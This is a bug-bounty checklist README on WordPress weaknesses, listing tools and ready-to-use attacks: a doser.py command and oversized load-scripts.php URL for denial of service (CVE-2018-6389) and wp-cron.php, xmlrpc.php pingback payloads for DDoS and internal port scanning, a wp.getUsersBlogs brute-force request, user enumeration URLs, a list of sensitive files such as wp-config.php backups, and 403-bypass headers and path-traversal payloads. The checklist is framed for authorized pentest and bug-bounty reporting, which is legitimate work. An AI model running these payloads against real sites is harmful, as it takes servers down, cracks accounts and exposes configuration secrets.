# Wordpress Common Misconfiguration
Here I will try my best to mention all common security misconfigurations for Wordpress I saw before or officially referenced. I will be attaching all poc and reference as well

# Index
* [Wordpress Detection](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#wordpress-detection)
* [General Scan Tool](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#geneal-scan-tool)
* [Admin Panel](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#admin-panel)
* [CVE-2018-6389](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#cve-2018-6389)
* [xmlrpc.php](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#xmlrpcphp)
* [Denial of Service via Cronjob](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#denial-of-service-via-cronjob)
* [Denial of Service via load-scripts.php (CVE-2018-6389)](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#denial-of-service-via-load-scriptsphp-cve-2018-6389)
* [WP User Enumeration](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#wp-user-enumeration)
* [Sensitive files exposed](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#sensitive-files-exposed)
* [Bypass 403](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#Bypass-403)
* [Enumerating plugins](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#enumerating-plugins)


# Wordpress Detection
Well, if you are reading this you already know about technology detection tool and methods.
Still adding them below
* Wappalyzer
* WhatRuns
* BuildWith

# Geneal Scan Tool
* [WpScan](https://github.com/wpscanteam/wpscan)
* [WPrecon](https://github.com/blackcrw/wprecon)
* [cms-checker](https://github.com/oways/cms-checker)
* [https://wpsec.com](https://wpsec.com/)
* [For more see this](https://www.infosecmatter.com/cms-vulnerability-scanners-for-wordpress-joomla-drupal-moodle-typo3/)


# Admin Panel
If you find admin login panel you must report it in pentest.
On a typical WordPress install, all you need to do is add /login/ or /admin/ to the end of your site URL.

For example:

`www.example.com/admin/`</br>
`www.example.com/login/`

If for some reason, your WordPress login URL is not working properly, then you can easily access the WordPress login page by going to this URL:

`www.example.com/wp-login.php`

Or you can directly access your admin area by entering the website URL like this:

`www.example.com/admin/`</br>
`www.example.com/wp-admin/`

### Bypass
* If you cant find admin panel Just go to /wp-admin/install.php and you'll find out where the login page has moved!
* If you got 403 try methods that will explain in "[Bypass 403 pages](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/WordPress/README.md#bypass-403)".


# CVE-2018-6389
This issue can down any Wordpress site under 4.9.3 So while reporting make sure that your target website is running wordpress under 4.9.3

### Detection
Use the URL from my gist called loadsxploit, you will get a massive js data in response.

[loadsxploit](https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9)

### Exploit
You can use any Dos tool i found Doser really fast and it shut down the webserver within 30 second

[Doser](https://github.com/quitten/doser.py)
```
python3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit'
```
### References
[H1 Report](https://hackerone.com/reports/752010)

[CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389)

[Blog Post](https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html)


# xmlrpc.php 
This is one of the common issue on wordpress. To get some bucks with this misconfiguration you must have to exploit it fully, and have to show the impact properly as well. <br></br>
what is XMLRPC :  </br>
XML-RPC is a remote procedure call (RPC) protocol which uses XML to encode its calls and HTTP as a transport mechanism.“XML-RPC” also refers generically to the use of XML for remote procedure call, independently of the specific protocol.Basically its a file which can be used for pulling POST data from a website through Remote Procedure Call. </br>

in wordpress its a API which allows developers for doing manipulations in the wordpress site for eg: </br>

Publish a post, Edit a post , Delete a post and even possible to upload some files. </br>

### Detection
* visit site.com/xmlrpc.php
* Get the error message about POST request only

### Exploit
* Intercept the request and change the method GET to POST
* List all Methods
    ```
    <methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
    </methodCall>
    ```
* Check the ```pingback.ping``` mentod is there or not
* Perform DDOS
    ```
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param>
    <value><string>http://<YOUR SERVER >:<port></string></value>
    </param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
    </value></param></params>
    </methodCall>
    ```
* Perform SSRF (Internal PORT scan only)
    ```
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param>
    <value><string>http://<YOUR SERVER >:<port></string></value>
    </param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
    </value></param></params>
    </methodCall>
    ```
    ![xmlrpctossrf](https://user-images.githubusercontent.com/63053441/137260425-a41ced8d-ce2b-4dd3-a98b-a78a0def55f0.jpg)
    
    ![xmlrpctossrf2](https://user-images.githubusercontent.com/63053441/137260444-ae4eaf77-1e0e-43e9-a2b2-6babee48cc75.jpg)



### Tool To Automate XMLRPC-Scan.

[XMLRPC-Scan](https://github.com/nullfil3/xmlrpc-scan)

### References
[Bug Bounty Cheat Sheet](https://m0chan.github.io/2019/12/17/Bug-Bounty-Cheetsheet.html)

[Medium Writeup](https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32)

[WpEngine Blog Post](https://wpengine.com/resources/xmlrpc-php/)


# Denial of Service via Cronjob
This is another area where you can perform a DOS attack.

### Detection
* visit site.com/wp-cron.php
* You will see a Blank page with 200 HTTP status code

### Exploit
You can use the same tool Doser for exploiting this 
```
python3 doser.py -t 999 -g 'https://site.com/wp-cron.php'
```
### Reference

[GitHub Issue](https://github.com/wpscanteam/wpscan/issues/1299)

[Medium Writeup](https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30)

# Denial of Service via load-scripts.php (CVE-2018-6389)
In WordPress through 4.9.2 allows users to load multiple JS files and CSS files through load-scripts.php files at once. For example, https://example.com/wp-admin/load-scripts.php?c=1&load[]=jquery-ui-core,editor&ver=4.9.1, file load-scripts.php will load jquery-ui-core and editor files automatically and return the contents of the file.
However, the number and size of files are not restricted in the process of loading JS files, attackers can use this function to deplete server resources and launch denial of service attacks.

the load-scripts.php file was receiving a parameter called load[]. This parameter is an array that was receiving the names of the JS files that needed to be loaded. In this case, it was receiving jQuery UI Core, which is the name of one of the Javascript files used by the WordPress login page. (it can be longer, this is just an example)
As no rate-limiting is setup for this URL - then DoS comes real.

```
http://example.com/wp-admin/load-scripts.php?c=1&load[]=jquery-ui-core&ver=4.9.1
```
### Exploit
```
http://example.com/wp-admin/load-scripts.php?load=react,react-dom,moment,lodash,wp-polyfill-fetch,wp-polyfill-formdata,wp-polyfill-node-contains,wp-polyfill-url,wp-polyfill-dom-rect,wp-polyfill-element-closest,wp-polyfill,wp-block-library,wp-edit-post,wp-i18n,wp-hooks,wp-api-fetch,wp-data,wp-date,editor,colorpicker,media,wplink,link,utils,common,wp-sanitize,sack,quicktags,clipboard,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-reply,json2,underscore,backbone,wp-util,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrate,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,esprima,jshint,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-bar,wplink,wpdialogs,word-count,media-upload,hoverIntent,hoverintent-js,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embed,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,site-health,privacy-tools,updates,farbtastic,iris,wp-color-picker,dashboard,list-revisions,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter

Also You Can Use load-styles.php:
http://target.com/wp-admin/load-styles.php?&load=common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,widgets,site-icon,l10n,install,wp-color-picker,customize-controls,customize-widgets,customize-nav-menus,customize-preview,ie,login,site-health,buttons,admin-bar,wp-auth-check,editor-buttons,media-views,wp-pointer,wp-jquery-ui-dialog,wp-block-library-theme,wp-edit-blocks,wp-block-editor,wp-block-library,wp-components,wp-edit-post,wp-editor,wp-format-library,wp-list-reusable-blocks,wp-nux,deprecated-media,farbtastic
```

### Reference
[hackerone](https://hackerone.com/reports/694467)

# WP User Enumeration
This issue will only acceptable when target website is hiding their current users or they are not publically available. So attacker can use those user data for bruteforcing and other staff

### Methods
- CVE-2017-5487 
    - visit site.com/wp-json/wp/v2/users/
    - You will see json data with user info in response
    - if you got 403 error you can use this bypass </br>
    ![wpb](https://user-images.githubusercontent.com/63053441/137262896-0d59a62d-c386-4009-af84-4266b72428b6.png)
    - try `http://target.com/?rest_route=/wp/v2/users`

- /?author=1
    - `http://target.com/?author=1`
    - Increment the number to get more
- User enum with admin panel
    - If you have access to admin panell you can get valid usernames </br>
    ![wpb](https://user-images.githubusercontent.com/63053441/137263541-19c7df14-4ae4-41f7-b5c3-2a438bb05eb1.png)<br></br>



### Exploit
If you have xmlrpc.php and this User enumeration both presence there. Then you can chain them out by collecting username from wp-json and perform Bruteforce on them via xmlrpc.php. It will surely show some extra effort and increase the impact as well.</br>
To perform the bruteforce login send the following request in the POST method.</br>
```
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
![image](https://user-images.githubusercontent.com/63053441/137264288-1cd036f8-a002-4409-8b23-ab8833cc6984.png)</br>

I think now you can assume the impact of this vulnerability , it can be used to perform bruteforce attacks for secure credentials and also can automate a major DDOS attack. </br>
Usefull methods:
```
wp.getUserBlogs
wp.getCategories
metaWeblog.getUsersBlogs
```

### Reference
[H1 Report](https://hackerone.com/reports/356047)


# Sensitive files exposed
This is list of files that can exposure sensitive data, so add it to your list
```
wp-includes
wp-content/uploads
wp-content/debug.log
Wp-load
Wp-json
index.php
wp-login.php
wp-links-opml.php
wp-activate.php
wp-blog-header.php
wp-cron.php
wp-links.php
wp-mail.php
xmlrpc.php
wp-settings.php
wp-trackback.php
wp-ajax.php
wp-admin.php
wp-config.php
.wp-config.php.swp
wp-config.inc
wp-config.old
wp-config.txt
wp-config.html
wp-config.php.bak
wp-config.php.dist
wp-config.php.inc
wp-config.php.old
wp-config.php.save
wp-config.php.swp
wp-config.php.txt
wp-config.php.zip
wp-config.php.html
wp-config.php~
/wp-admin/setup-config.php?step=1
/wp-admin/install.php
```


# Bypass 403

- X-Rewrite-Url Header is Can be used to bypass WordPress 403 pages.
```
POST /xmlrpc HTTP/1.1        
Host: http://target.com
X-Rewrite-Url: xmlrpc.php
X-Rewrite-Url: wp-json/v2/users
X-Rewrite-Url: wp-login.php
```
- Authorization bypass using .json
![image](https://user-images.githubusercontent.com/63053441/137277282-accb1647-a966-4c91-b319-3f29cfc1381c.png)

    Endpoint bypass paylod list:
    ```
    ?
    ??
    &
    #
    %
    %20
    %09
    /
    /..;/
    ../
    ..%2f
    ..:/
    ../
    \..\.\
    .././
    ..%00/
    ..%0d/
    ..%5c
    ..\
    ..%ff
    %2e%2e%2e%2f
    .%2e/
    %3f
    %26
    %23
    .json
    ```
### Tools
https://github.com/yunemse48/403bypasser</br>
https://github.com/iamj0ker/bypass-403



# Enumerating plugins
If you have a Wordpreess target, dont forget to enumerate the plugins on "/wp-content/plugins/FUZZ/readme.txt".
Read the stable tag, and try to find CVEs or exploits for that versions.

Alse you can use:</br>
`grep all "wp-content/plugins/" from html`<br></br>
You cant find some common exploits here:</br>
https://github.com/Mad-robot/wordpress-exploits


# Reference
Twitters:</br>
@jae_hak99
@minometidji
@sw33tLie
@Jester0x01
@daffainfo
@SalimAlk15
@xalerafera
@gopalsamy_ru
@16yashpatel
@fuxsocy_py
@EkinBayer4
@3XS0
@CyberWarship
@vxer0dayz</br>
</br>https://github.com/daffainfo/AllAboutBugBounty</br>
https://github.com/KathanP19/HowToHunt</br>
https://malavsharma.medium.com/wordpress-xmlrpc-php-my-first-resolved-report-bee438f35ad8
